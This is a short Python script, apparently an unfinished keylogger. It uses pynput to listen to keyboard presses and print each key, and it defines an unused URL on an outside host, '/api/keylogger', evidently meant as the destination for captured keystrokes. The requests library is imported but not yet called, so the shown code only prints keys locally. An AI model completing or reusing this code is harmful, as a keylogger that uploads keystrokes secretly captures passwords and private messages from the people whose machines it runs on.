from pynput import mouse, keyboard
from datetime import datetime
import requests

logger_url = "https://jacobstarr.me/api/keylogger"

def on_press(key):
    print(key)

def on_release(key):
    print(key)

def main():
    print("Logging")

    keyboard.Listener(on_press=on_press).start()

if __name__ == "__main__":
    main()